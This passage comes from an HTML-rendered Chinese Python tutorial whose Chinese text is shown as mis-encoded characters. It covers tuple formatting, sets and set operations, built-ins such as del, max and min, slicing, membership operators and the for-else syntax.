¼å¼åŒ–å­—ç¬¦ä¸²åé¢çš„ () æœ¬è´¨ä¸Šå°±æ˜¯å…ƒç»„</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;%s å¹´é¾„æ˜¯ %dï¼Œ èº«é«˜æ˜¯ %.2f&quot;</span> % info_tuple)</span><br><span class="line">info_str = <span class="string">&quot;%s å¹´é¾„æ˜¯ %dï¼Œ èº«é«˜æ˜¯ %.2f&quot;</span> % info_tuple</span><br><span class="line"><span class="built_in">print</span>(info_str)</span><br></pre></td></tr></table></figure><h3 id="å…ƒç»„å’Œåˆ—è¡¨ä¹‹é—´çš„è½¬æ¢">å…ƒç»„å’Œåˆ—è¡¨ä¹‹é—´çš„è½¬æ¢</h3><ul><li>ä½¿ç”¨ <code>list</code> å‡½æ•°å¯ä»¥æŠŠå…ƒç»„è½¬æ¢æˆåˆ—è¡¨</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">list</span>(å…ƒç»„)</span><br></pre></td></tr></table></figure><ul><li>ä½¿ç”¨ <code>tuple</code> å‡½æ•°å¯ä»¥æŠŠåˆ—è¡¨è½¬æ¢æˆå…ƒç»„</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">tuple</span>(åˆ—è¡¨)</span><br></pre></td></tr></table></figure><h1 id="é›†åˆ">é›†åˆ</h1><p>Basically, sets are used for <strong>membership testing</strong> and<strong>eliminating duplicate entries</strong>ã€‚</p><p>ä¸€èˆ¬æœ‰é‡å¤çš„æ•°æ®ï¼Œä¸è¦æ±‚å»é‡çš„æ—¶å€™ï¼Œä¸ä½¿ç”¨é›†åˆï¼Œå¯ä»¥ä½¿ç”¨åˆ—è¡¨éå†è¿›è¡Œæ“ä½œã€‚</p><ol start="0" type="1"><li><p>æ³¨æ„å»é‡æ—¶ï¼Œé•¿åº¦å˜åŒ–äº†ï¼Œçœ‹ä½ éœ€è¦ä¹‹å‰çš„é•¿åº¦ï¼Œè¿˜æ˜¯éœ€è¦ lené‡æ–°è®¡ç®—ä¸€ä¸‹é•¿åº¦ã€‚</p></li><li><p>å¯ä»¥ä½¿ç”¨å¤§æ‹¬å· <code>&#123; &#125;</code> æˆ–è€… <code>set()</code>å‡½æ•°åˆ›å»ºé›†åˆï¼Œæ³¨æ„ï¼šåˆ›å»ºä¸€ä¸ªç©ºé›†åˆå¿…é¡»ç”¨ <code>set()</code> è€Œä¸æ˜¯<code>&#123; &#125;</code> ï¼Œå› ä¸º <code>&#123; &#125;</code> æ˜¯ç”¨æ¥åˆ›å»ºä¸€ä¸ªç©ºå­—å…¸ã€‚</p><p>åˆ›å»ºæ ¼å¼ï¼š</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">parame = &#123;value01,value02,...&#125;</span><br><span class="line">æˆ–è€…</span><br><span class="line"><span class="built_in">set</span>(value)</span><br></pre></td></tr></table></figure></p></li><li><p>é›†åˆåªèƒ½å®¹çº³ immutable datatypeï¼Œä¸èƒ½å®¹çº³è¯¸å¦‚ï¼šåˆ—è¡¨ã€é›†åˆã€å­—å…¸ç­‰å¯å˜æ•°æ®ç±»å‹ã€‚</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>myset = &#123;<span class="number">1</span>,<span class="number">2</span>,[<span class="number">1</span>,<span class="number">2</span>],<span class="string">&quot;w&quot;</span>&#125;</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unhashable <span class="built_in">type</span>: <span class="string">&#x27;list&#x27;</span></span><br></pre></td></tr></table></figure></p></li></ol><h2 id="å¸¸ç”¨æ“ä½œ">å¸¸ç”¨æ“ä½œ</h2><ol type="1"><li><p><code>set.add(x)</code> x åªèƒ½ä¸ºä¸€ä¸ªä¸å¯å˜å…ƒç´ </p></li><li><p><code>set.remove(x)</code> å°†å…ƒç´  x ä»é›†åˆ sä¸­ç§»é™¤ï¼Œå¦‚æœå…ƒç´ ä¸å­˜åœ¨ï¼Œåˆ™ä¼šå‘ç”Ÿé”™è¯¯ã€‚</p></li><li><p><code>set.discard(x)</code>ç§»é™¤é›†åˆä¸­çš„å…ƒç´ ï¼Œä¸”å¦‚æœå…ƒç´ ä¸å­˜åœ¨ï¼Œä¸ä¼šå‘ç”Ÿé”™è¯¯ã€‚</p></li><li><p><code>set.update(iterable)</code></p><p>å°†å¯è¿­ä»£å¯¹è±¡çš„å…ƒç´ åŠ å…¥åˆ°è°ƒç”¨è€…é›†åˆï¼Œå¹¶å»é‡ã€‚</p><p>Parameters: This method accepts iterable (list, tuple, dictionaryetc.) as parameters. Return Value: It does not return anything, it justupdates the calling Set.</p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">20</span>]: set1 = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">21</span>]: set2 = &#123;<span class="number">3</span>,<span class="number">4</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">22</span>]: set2.update(set1)</span><br><span class="line"></span><br><span class="line">In [<span class="number">23</span>]: set2</span><br><span class="line">Out[<span class="number">23</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h2 id="é›†åˆè¿ç®—">é›†åˆè¿ç®—</h2><ol type="1"><li><p><code>union()</code> æˆ– <code>|</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">36</span>]: set1, set2</span><br><span class="line">Out[<span class="number">36</span>]: (&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>&#125;, &#123;<span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;)</span><br><span class="line">In [<span class="number">37</span>]: set1 | set2</span><br><span class="line">Out[<span class="number">37</span>]: &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">38</span>]: <span class="built_in">print</span>(set1.union(set2))</span><br><span class="line">&#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>intersection()</code> æˆ– <code>&amp;</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">39</span>]: set1 &amp; set2</span><br><span class="line">Out[<span class="number">39</span>]: &#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">40</span>]: set1.intersection(set2)</span><br><span class="line">Out[<span class="number">40</span>]: &#123;<span class="number">2</span>, <span class="number">3</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>difference()</code> æˆ– <code>-</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">41</span>]: set1 - set2</span><br><span class="line">Out[<span class="number">41</span>]: &#123;<span class="number">1</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">42</span>]: set1.difference(set2)</span><br><span class="line">Out[<span class="number">42</span>]: &#123;<span class="number">1</span>&#125;</span><br></pre></td></tr></table></figure></p></li><li><p><code>symmetric_difference()</code> æˆ– <code>^</code></p><p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">43</span>]: set1.symmetric_difference(set2)</span><br><span class="line">Out[<span class="number">43</span>]: &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">In [<span class="number">44</span>]: set1 ^ set2</span><br><span class="line">Out[<span class="number">44</span>]: &#123;<span class="number">1</span>, <span class="number">4</span>, <span class="number">5</span>&#125;</span><br></pre></td></tr></table></figure></p></li></ol><h1 id="å…¬å…±æ–¹æ³•">å…¬å…±æ–¹æ³•</h1><p>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸éƒ½å¯ä»¥ä½¿ç”¨çš„æ–¹æ³•ã€‚</p><h2 id="python-å†…ç½®å‡½æ•°">Python å†…ç½®å‡½æ•°</h2><p>Python åŒ…å«äº†ä»¥ä¸‹å†…ç½®å‡½æ•°ï¼š</p><table><colgroup><col style="width: 21%" /><col style="width: 41%" /><col style="width: 37%" /></colgroup><thead><tr class="header"><th>å‡½æ•°</th><th>æè¿°</th><th>å¤‡æ³¨</th></tr></thead><tbody><tr class="odd"><td>len(item)</td><td>è®¡ç®—å®¹å™¨ä¸­å…ƒç´ ä¸ªæ•°</td><td></td></tr><tr class="even"><td>del(item)</td><td>åˆ é™¤å˜é‡</td><td>del æœ‰ä¸¤ç§æ–¹å¼: å…³é”®å­—ã€å‡½æ•°</td></tr><tr class="odd"><td>max(item)</td><td>è¿”å›å®¹å™¨ä¸­å…ƒç´ æœ€å¤§å€¼</td><td>å¦‚æœæ˜¯å­—å…¸ï¼Œåªé’ˆå¯¹ key æ¯”è¾ƒ</td></tr><tr class="even"><td>min(item)</td><td>è¿”å›å®¹å™¨ä¸­å…ƒç´ æœ€å°å€¼</td><td>å¦‚æœæ˜¯å­—å…¸ï¼Œåªé’ˆå¯¹ key æ¯”è¾ƒ</td></tr><tr class="odd"><td>cmp(item1, item2)</td><td>æ¯”è¾ƒä¸¤ä¸ªå€¼ï¼Œ-1 å°äº/0 ç›¸ç­‰/1 å¤§äº</td><td><strong>Python 3.x å–æ¶ˆäº† cmp å‡½æ•°</strong></td></tr></tbody></table><h3 id="del-æ–¹æ³•å…³é”®å­—">del æ–¹æ³•/å…³é”®å­—:</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">1</span>]: a = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]</span><br><span class="line">In [<span class="number">2</span>]: <span class="keyword">del</span> a[<span class="number">2</span>]</span><br><span class="line">In [<span class="number">3</span>]: a</span><br><span class="line">Out[<span class="number">3</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">4</span>]: <span class="keyword">del</span>(a[<span class="number">1</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">5</span>]: a</span><br><span class="line">Out[<span class="number">5</span>]: [<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">6</span>]: <span class="keyword">del</span>(a)</span><br><span class="line">In [<span class="number">7</span>]: a</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---NameError                                 Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">7</span>-3f786850e387&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> a</span><br><span class="line"></span><br><span class="line">NameError: name <span class="string">&#x27;a&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br></pre></td></tr></table></figure><h3 id="maxmin-æ–¹æ³•å…³é”®å­—">max/min æ–¹æ³•å…³é”®å­—:</h3><p>æ³¨æ„: max/min æ˜¯é’ˆå¯¹å­—å…¸çš„ key è¿›è¡Œç»Ÿè®¡æ¯”è¾ƒ</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">18</span>]: t_dict = &#123;<span class="string">&quot;z&quot;</span>:<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;a&quot;</span>:<span class="string">&quot;world&quot;</span>&#125;</span><br><span class="line">In [<span class="number">19</span>]: <span class="built_in">max</span>(t_dict)</span><br><span class="line">Out[<span class="number">19</span>]: <span class="string">&#x27;z&#x27;</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">20</span>]: <span class="built_in">min</span>(t_dict)</span><br><span class="line">Out[<span class="number">20</span>]: <span class="string">&#x27;a&#x27;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="æ¯”è¾ƒ">æ¯”è¾ƒ</h3><p>ä½¿ç”¨æ¯”è¾ƒè¿ç®—ç¬¦è¿›è¡Œå­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„çš„æ¯”è¾ƒã€‚</p><ul><li><strong>å­—ç¬¦ä¸²</strong> æ ¹æ® ASCII ç æ¯”è¾ƒï¼š "0" &lt; "A" &lt;"a"</li><li>åˆ—è¡¨ã€å…ƒç»„æ˜¯é€ä¸ªå¯¹åº”å…ƒç´ è¿›è¡Œæ¯”è¾ƒ</li><li>æ²¡æœ‰å­—å…¸æ¯”è¾ƒçš„éœ€æ±‚ã€‚å­—å…¸ä¹‹é—´ä¸èƒ½æ¯”è¾ƒï¼Œå­—å…¸æ˜¯æ— åºçš„ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">24</span>]: <span class="string">&quot;12&quot;</span> &gt; <span class="string">&quot;23&quot;</span></span><br><span class="line">Out[<span class="number">24</span>]: <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">25</span>]: [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]&lt;[<span class="number">2</span>,<span class="number">1</span>,<span class="number">3</span>]</span><br><span class="line">Out[<span class="number">25</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">26</span>]: (<span class="number">9</span>,<span class="number">3</span>,<span class="number">1</span>)&lt;(<span class="number">1</span>,<span class="number">4</span>,<span class="number">10</span>)</span><br><span class="line">Out[<span class="number">26</span>]: <span class="literal">False</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="åˆ‡ç‰‡">åˆ‡ç‰‡</h2><div class="line-block">æè¿° | Python è¡¨è¾¾å¼ | ç»“æœ | æ”¯æŒçš„æ•°æ®ç±»å‹|<br />:---: | ------------------ | ------- | ------------------ | |<br />åˆ‡ç‰‡ | "0123456789"[::-2] | "97531" | å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ |</div><ul><li><strong>åˆ‡ç‰‡</strong> ä½¿ç”¨ <strong>ç´¢å¼•å€¼</strong>æ¥é™å®šèŒƒå›´ï¼Œä»ä¸€ä¸ªå¤§çš„ <strong>å­—ç¬¦ä¸²</strong> ä¸­ <strong>åˆ‡å‡º</strong>å°çš„ <strong>å­—ç¬¦ä¸²</strong></li><li><strong>åˆ—è¡¨</strong> å’Œ <strong>å…ƒç»„</strong> éƒ½æ˜¯<strong>æœ‰åº</strong> çš„é›†åˆï¼Œéƒ½èƒ½å¤Ÿ <strong>é€šè¿‡ç´¢å¼•å€¼</strong>è·å–åˆ°å¯¹åº”çš„æ•°æ®</li><li><strong>å­—å…¸</strong> æ˜¯ä¸€ä¸ª <strong>æ— åº</strong> çš„é›†åˆï¼Œæ˜¯ä½¿ç”¨<strong>é”®å€¼å¯¹</strong>ä¿å­˜æ•°æ®ï¼Œå­—å…¸æ— åºï¼Œæ²¡æœ‰ç´¢å¼•çš„æ¦‚å¿µï¼Œä¹Ÿå°±ä¸å­˜åœ¨åˆ‡ç‰‡ã€‚</li></ul><h2 id="åˆ‡ç‰‡è¶…å‡ºç´¢å¼•ä¸æŠ¥é”™">åˆ‡ç‰‡è¶…å‡ºç´¢å¼•ä¸æŠ¥é”™</h2><p>å½“æˆ‘ä»¬ç›´æ¥ä»¥ç´¢å¼•å€¼æ¥è®¿é—® collection çš„å…ƒç´ æ—¶ï¼Œå¦‚æœè¶…å‡ºèŒƒå›´ä¼šæŠ¥é”™ä½†æ˜¯å¯åˆ‡ç‰‡çš„å¯¹è±¡(æœ‰ç´¢å¼•çš„å¯¹è±¡)åœ¨åˆ‡ç‰‡ä¸­çš„ç´¢å¼•è¶…å‡ºèŒƒå›´æ—¶ï¼Œä¸ä¼šæŠ¥é”™ã€‚è¿™æ ·å°±ä¸ç”¨è€ƒè™‘è¾¹ç•Œé—®é¢˜äº†ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">13</span>]: text = <span class="string">&quot;hello&quot;</span></span><br><span class="line">In [<span class="number">18</span>]: text[<span class="number">10</span>]</span><br><span class="line">------------------------------------------------------------------------mathjax: true</span><br><span class="line">---IndexError                                Traceback (most recent call last)</span><br><span class="line">&lt;ipython-<span class="built_in">input</span>-<span class="number">18</span>-e38b07adaaf8&gt; <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">----&gt; <span class="number">1</span> text[<span class="number">10</span>]</span><br><span class="line"></span><br><span class="line">IndexError: string index out of rang</span><br><span class="line"></span><br><span class="line">In [<span class="number">14</span>]: text[<span class="number">3</span>:<span class="number">10</span>]</span><br><span class="line">Out[<span class="number">14</span>]: <span class="string">&#x27;lo&#x27;</span></span><br></pre></td></tr></table></figure><p>åˆ—è¡¨ï¼Œå…ƒç»„å’Œä¸Šé¢ä¸€æ ·ã€‚</p><p><ahref="https://www.hackerrank.com/challenges/text-wrap/problem">ä¾‹é¢˜text-wrap</a> çŸ¥è¯†ç‚¹ï¼š</p><ol type="1"><li>range çš„ step å‚æ•°</li><li>åˆ‡ç‰‡è¶…å‡ºèŒƒå›´ä¸æŠ¥é”™</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">wrap</span>(<span class="params">string, max_width</span>):</span><br><span class="line">    str_len = <span class="built_in">len</span>(string)</span><br><span class="line">    <span class="keyword">for</span>  i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>,str_len,max_width):</span><br><span class="line">        <span class="built_in">print</span>(string[i:i+max_width])</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    string, max_width = <span class="built_in">input</span>(), <span class="built_in">int</span>(<span class="built_in">input</span>())</span><br><span class="line">    result = wrap(string, max_width)</span><br></pre></td></tr></table></figure><h2 id="åˆ¤æ–­åºåˆ—æ˜¯å¦ç©º">åˆ¤æ–­åºåˆ—æ˜¯å¦ç©º</h2><p>PEP8 é‡Œé¢æ¨èçš„åˆ¤æ–­éç©ºçš„æ–¹æ³•: <code>if seq</code> python åœ¨æ±‚sequence (string, list, tuple) çš„ bool å€¼çš„æ—¶å€™ä¼šæŠŠç©ºçš„ç»™ evaluate æˆFalseã€‚</p><p>For sequences, (strings, lists, tuples), use the fact that emptysequences are false.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Yes: <span class="keyword">if</span> <span class="keyword">not</span> seq:</span><br><span class="line">     <span class="keyword">if</span> seq:</span><br><span class="line"></span><br><span class="line">No:  <span class="keyword">if</span> <span class="built_in">len</span>(seq):</span><br><span class="line">     <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">len</span>(seq):</span><br></pre></td></tr></table></figure><p><ahref="https://www.python.org/dev/peps/pep-0008/#programming-recommendations">PEP0008 -- Style Guide for Python Code</a></p><h2 id="è¿ç®—ç¬¦">è¿ç®—ç¬¦</h2><table><colgroup><col style="width: 12%" /><col style="width: 21%" /><col style="width: 28%" /><col style="width: 14%" /><col style="width: 24%" /></colgroup><thead><tr class="header"><th style="text-align: center;">è¿ç®—ç¬¦</th><th>Python è¡¨è¾¾å¼</th><th>ç»“æœ</th><th>æè¿°</th><th>æ”¯æŒçš„æ•°æ®ç±»å‹</th></tr></thead><tbody><tr class="odd"><td style="text-align: center;">+</td><td>[1, 2] + [3, 4]</td><td>[1, 2, 3, 4]</td><td>åˆå¹¶</td><td>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</td></tr><tr class="even"><td style="text-align: center;">*</td><td>["Hi!"] * 4</td><td>['Hi!', 'Hi!', 'Hi!', 'Hi!']</td><td>é‡å¤</td><td>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</td></tr><tr class="odd"><td style="text-align: center;">in</td><td>3 in (1, 2, 3)</td><td>True</td><td>å…ƒç´ æ˜¯å¦å­˜åœ¨</td><td>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸</td></tr><tr class="even"><td style="text-align: center;">not in</td><td>4 not in (1, 2, 3)</td><td>True</td><td>å…ƒç´ æ˜¯å¦ä¸å­˜åœ¨</td><td>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„ã€å­—å…¸</td></tr><tr class="odd"><td style="text-align: center;">&gt; &gt;= == &lt; &lt;=</td><td>(1, 2, 3) &lt; (2, 2, 3)</td><td>True</td><td>å…ƒç´ æ¯”è¾ƒ</td><td>å­—ç¬¦ä¸²ã€åˆ—è¡¨ã€å…ƒç»„</td></tr></tbody></table><p><code>+</code> ä¸ <code>extend</code> çš„åŒºåˆ«:</p><p><code>+</code> ä¸æ”¹å˜åŸåˆ—è¡¨ï¼Œç”Ÿæˆä¸€ä¸ªæ–°çš„åˆ—è¡¨ï¼Œextendç›´æ¥æ‰©å±•æ”¹å˜åŸåˆ—è¡¨, ä¸ç”Ÿæˆæ–°åˆ—è¡¨ã€‚å½“ç„¶, append æ–¹æ³•ä¹Ÿæ˜¯ä¿®æ”¹åŸåˆ—è¡¨ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">48</span>]: t_list</span><br><span class="line">Out[<span class="number">48</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">49</span>]: t_list+[<span class="number">3</span>,<span class="number">4</span>]</span><br><span class="line">Out[<span class="number">49</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">50</span>]: t_list</span><br><span class="line">Out[<span class="number">50</span>]: [<span class="number">1</span>, <span class="number">2</span>]</span><br><span class="line"></span><br><span class="line">In [<span class="number">51</span>]: t_list.extend([<span class="number">3</span>,<span class="number">4</span>])</span><br><span class="line"></span><br><span class="line">In [<span class="number">52</span>]: t_list</span><br><span class="line">Out[<span class="number">52</span>]: [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>]</span><br></pre></td></tr></table></figure><p><strong>æ³¨æ„</strong></p><ul><li><code>in / not in</code> åœ¨å¯¹ <strong>å­—å…¸</strong> æ“ä½œæ—¶ï¼Œåˆ¤æ–­çš„æ˜¯<strong>å­—å…¸çš„é”®</strong></li><li><code>in</code> å’Œ <code>not in</code> è¢«ç§°ä¸º<strong>æˆå‘˜è¿ç®—ç¬¦</strong></li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">In [<span class="number">56</span>]: <span class="string">&quot;name&quot;</span> <span class="keyword">in</span> &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;laowang&quot;</span>&#125;</span><br><span class="line">Out[<span class="number">56</span>]: <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">In [<span class="number">57</span>]: <span class="string">&quot;laowang&quot;</span> <span class="keyword">in</span> &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;laowang&quot;</span>&#125;</span><br><span class="line">Out[<span class="number">57</span>]: <span class="literal">False</span></span><br></pre></td></tr></table></figure><h4 id="æˆå‘˜è¿ç®—ç¬¦">æˆå‘˜è¿ç®—ç¬¦</h4><p>æˆå‘˜è¿ç®—ç¬¦ç”¨äº <strong>æµ‹è¯•</strong> åºåˆ—ä¸­æ˜¯å¦åŒ…å«æŒ‡å®šçš„<strong>æˆå‘˜</strong></p><table><colgroup><col style="width: 6%" /><col style="width: 57%" /><col style="width: 35%" /></colgroup><thead><tr class="header"><th>è¿ç®—ç¬¦</th><th>æè¿°</th><th>å®ä¾‹</th></tr></thead><tbody><tr class="odd"><td>in</td><td>å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td><td><code>3 in (1, 2, 3)</code> è¿”å› <code>True</code></td></tr><tr class="even"><td>not in</td><td>å¦‚æœåœ¨æŒ‡å®šçš„åºåˆ—ä¸­æ²¡æœ‰æ‰¾åˆ°å€¼è¿”å› Trueï¼Œå¦åˆ™è¿”å› False</td><td><code>3 not in (1, 2, 3)</code> è¿”å› <code>False</code></td></tr></tbody></table><p>æ³¨æ„ï¼šåœ¨å¯¹ <strong>å­—å…¸</strong> æ“ä½œæ—¶ï¼Œåˆ¤æ–­çš„æ˜¯<strong>å­—å…¸çš„é”®</strong></p><h1 id="å®Œæ•´çš„-for-å¾ªç¯è¯­æ³•"><del>å®Œæ•´çš„ for å¾ªç¯è¯­æ³•</del></h1><p>Notice: ã€ŠEffective Pythonã€‹ä¸å»ºè®®ä½¿ç”¨è¯¥è¯­æ³•, ä¸è¦åœ¨ for å’Œ whileå¾ªç¯åé¢å†™ else å—</p><ul><li>åœ¨ <code>Python</code> ä¸­å®Œæ•´çš„ <code>for å¾ªç¯</code>çš„è¯­æ³•å¦‚ä¸‹ï¼š</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> å˜é‡ <span class="keyword">in</span> é›†åˆ:</span><br><span class="line"></span><br><span class="line">    å¾ªç¯ä½“ä»£ç </span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    æ²¡æœ‰é€šè¿‡ <span class="keyword">break</span> é€€å‡ºå¾ªç¯ï¼Œå¾ªç¯ç»“æŸåï¼Œä¼šæ‰§è¡Œçš„ä»£ç </span><br></pre></td></tr></table></figure><p>å½“é›†åˆéå†å®Œæˆåï¼Œ <code>else</code> ä»£ç å—å°±ä¼šè¢«æ‰§è¡Œã€‚ å¦‚æœä¸­é€”é€šè¿‡<code>break</code> é€€å‡ºå¾ªç¯ï¼Œå¯¼è‡´é›†åˆæœªéå†å®Œæˆï¼Œé‚£ä¹ˆ <code>else</code>ä»£ç å—å°±ä¸ä¼šè¢«æ‰§è¡Œã€‚</p><p>å¯ä»¥çœ‹å‡ºï¼Œelseå†…çš„è¯­å¥ä¼šåœ¨å¾ªç¯è¯­å¥ç»“æŸåç«‹å³æ‰§è¡Œã€‚ä½†æ˜¯å¾ˆå¥‡æ€ªï¼Œä¸ºä»€ä¹ˆå« else å‘¢ï¼Ÿ</p><p>å¸¸ç”¨çš„ else å¦‚ if/elseï¼Œtry/except/elseç­‰éƒ½æ˜¯å‰é¢çš„ä»£ç å—ä¸æ‰§è¡Œæ‰æ‰§è¡Œ 